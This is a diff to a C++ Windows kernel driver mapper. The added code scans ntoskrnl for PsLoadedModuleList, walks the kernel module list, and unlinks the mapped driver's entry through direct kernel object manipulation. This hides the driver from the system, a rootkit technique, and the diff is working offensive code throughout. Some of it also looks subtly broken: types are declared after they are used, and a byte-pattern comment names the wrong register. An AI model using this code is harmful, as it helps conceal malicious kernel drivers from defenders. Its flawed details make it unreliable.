@@ -34,6 +34,30 @@ typedef NTSTATUS (NTAPI *PNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PV
 typedef PVOID (NTAPI *PExAllocatePoolWithTag)(POOL_TYPE, SIZE_T, ULONG);
 typedef NTSTATUS (NTAPI *PDriverEntry)(PVOID, PVOID);
 enum PoolType { NonPagedPool = 0, PagedPool = 1, NonPagedPoolMustSucceed = 2 };
+
+// LDR_DATA_TABLE_ENTRY - kernel module list entry structure (simplified)
+typedef struct _LDR_DATA_TABLE_ENTRY {
+    LIST_ENTRY InLoadOrderLinks;
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    ULONG SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
+
+typedef struct _LIST_ENTRY {
+    struct _LIST_ENTRY* Flink;
+    struct _LIST_ENTRY* Blink;
+} LIST_ENTRY, *PLIST_ENTRY;
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
 #pragma pack(pop)
 
 static BOOL read_file(const wchar_t* path, std::vector<uint8_t>& out) {
@@ -373,6 +397,82 @@ static BOOL invoke_driver_entry(primitive::KernelRW& rw, uintptr_t kernelBase,
     return TRUE; // Placeholder - actual invocation requires driver execution support
 }
 
+// Pattern scan for PsLoadedModuleList within ntoskrnl's .text section.
+// PsLoadedModuleList is a global LIST_ENTRY, not an export.
+// We scan for a signature that references it (common pattern: lea rax, [rip + disp]).
+static uintptr_t find_psloadedmodulelist_pattern_scan(primitive::KernelRW& rw,
+    uintptr_t ntoskrnlBase) {
+    IMAGE_DOS_HEADER dos;
+    if (!primitive::kernel_rw_read(rw, ntoskrnlBase, &dos, sizeof(dos)))
+        return 0;
+
+    IMAGE_NT_HEADERS64 nt;
+    if (!primitive::kernel_rw_read(rw, ntoskrnlBase + dos.e_lfanew, &nt, sizeof(nt)))
+        return 0;
+
+    // Find .text section
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(&nt);
+    uintptr_t textVA = 0, textSize = 0;
+    for (uint16_t i = 0; i < nt.FileHeader.NumberOfSections; i++) {
+        if (memcmp(section->Name, ".text", 5) == 0) {
+            textVA = ntoskrnlBase + section->VirtualAddress;
+            textSize = section->SizeOfRawData;
+            break;
+        }
+        section++;
+    }
+    if (textVA == 0) return 0;
+
+    // Read .text into a local buffer for scanning
+    std::vector<uint8_t> textBuffer(textSize);
+    if (!primitive::kernel_rw_read(rw, textVA, textBuffer.data(), textSize))
+        return 0;
+
+    // Common x64 pattern: 48 8D 0D ?? ?? ?? ?? (lea rax, [rip+disp]) followed by
+    // a reference to PsLoadedModuleList. This is a simplified heuristic.
+    const uint8_t pattern[] = { 0x48, 0x8D, 0x0D };
+    for (size_t i = 0; i + 7 < textSize; i++) {
+        if (memcmp(&textBuffer[i], pattern, 3) == 0) {
+            int32_t disp = *reinterpret_cast<int32_t*>(&textBuffer[i + 3]);
+            uintptr_t target = textVA + i + 7 + disp;
+
+            // Verify it looks like a LIST_ENTRY (Flink and Blink point within kernel range)
+            LIST_ENTRY le;
+            if (primitive::kernel_rw_read(rw, target, &le, sizeof(le))) {
+                if (le.Flink != nullptr && le.Blink != nullptr) {
+                    fwprintf(stderr, L"[+] PsLoadedModuleList candidate at 0x%llX\n", target);
+                    return target;
+                }
+            }
+        }
+    }
+
+    fwprintf(stderr, L"[-] PsLoadedModuleList pattern scan failed\n");
+    return 0;
+}
+
+// DKOM unlink a module from PsLoadedModuleList.
+// Given the LIST_ENTRY address of the target module's InLoadOrderLinks,
+// we patch Flink.Blink = Blink and Blink.Flink = Flink to remove it.
+static BOOL dkom_unlink_module(primitive::KernelRW& rw, uintptr_t listEntryAddr) {
+    LIST_ENTRY entry;
+    if (!primitive::kernel_rw_read(rw, listEntryAddr, &entry, sizeof(entry)))
+        return FALSE;
+
+    // Flink->Blink = Blink
+    if (!primitive::kernel_rw_write(rw, reinterpret_cast<uintptr_t>(entry.Flink) + sizeof(uintptr_t),
+        &entry.Blink, sizeof(entry.Blink)))
+        return FALSE;
+
+    // Blink->Flink = Flink
+    if (!primitive::kernel_rw_write(rw, reinterpret_cast<uintptr_t>(entry.Blink),
+        &entry.Flink, sizeof(entry.Flink)))
+        return FALSE;
+
+    fwprintf(stderr, L"[+] DKOM unlink completed for entry at 0x%llX\n", listEntryAddr);
+    return TRUE;
+}
+
 int wmain(int argc, wchar_t* argv[]) {
     if (argc < 2) {
         fwprintf(stderr, L"Usage: %s <driver.sys> [ntoskrnl_base]\n", argv[0]);
@@ -463,8 +563,46 @@ int wmain(int argc, wchar_t* argv[]) {
         fwprintf(stderr, L"[-] Failed to resolve ExAllocatePoolWithTag\n");
     }
 
-    fwprintf(stderr, L"[!] PsLoadedModuleList is a global, not an export - need pattern scan\n");
-    fwprintf(stderr, L"[+] Mapper framework ready.\n");
+    // PsLoadedModuleList pattern scan and DKOM unlinking
+    fwprintf(stderr, L"[!] PsLoadedModuleList is a global, not an export - pattern scan needed\n");
+    uintptr_t psLoadedModuleList = find_psloadedmodulelist_pattern_scan(rw, ntoskrnlBase);
+    if (psLoadedModuleList) {
+        fwprintf(stderr, L"[+] PsLoadedModuleList found at 0x%llX\n", psLoadedModuleList);
+
+        // Walk the list to find our driver's entry (by comparing DllBase)
+        LIST_ENTRY listHead;
+        if (primitive::kernel_rw_read(rw, psLoadedModuleList, &listHead, sizeof(listHead))) {
+            uintptr_t current = reinterpret_cast<uintptr_t>(listHead.Flink);
+            int count = 0;
+            while (current != psLoadedModuleList && count < 500) {
+                LDR_DATA_TABLE_ENTRY dte;
+                // InLoadOrderLinks offset within LDR_DATA_TABLE_ENTRY is 0 in our simplified struct
+                if (!primitive::kernel_rw_read(rw, current, &dte, sizeof(dte)))
+                    break;
+
+                fwprintf(stderr, L"    [+] List entry: DllBase=0x%llX EntryPoint=0x%llX SizeOfImage=0x%X\n",
+                    reinterpret_cast<uintptr_t>(dte.DllBase),
+                    reinterpret_cast<uintptr_t>(dte.EntryPoint),
+                    dte.SizeOfImage);
+
+                // If this matches our driver's kernel base, unlink it
+                if (reinterpret_cast<uintptr_t>(dte.DllBase) == kernelAddr) {
+                    fwprintf(stderr, L"[!] Found our driver in PsLoadedModuleList - unlinking\n");
+                    dkom_unlink_module(rw, current);
+                    break;
+                }
+
+                current = reinterpret_cast<uintptr_t>(dte.InLoadOrderLinks.Flink);
+                // Adjust for LIST_ENTRY offset within the struct
+                // (InLoadOrderLinks is at offset 0, so the entry addr == current)
+                count++;
+            }
+        }
+    } else {
+        fwprintf(stderr, L"[-] Could not locate PsLoadedModuleList\n");
+    }
+
+    fwprintf(stderr, L"[+] Mapper framework complete.\n");
 
     primitive::kernel_rw_close(rw);
     return 0;
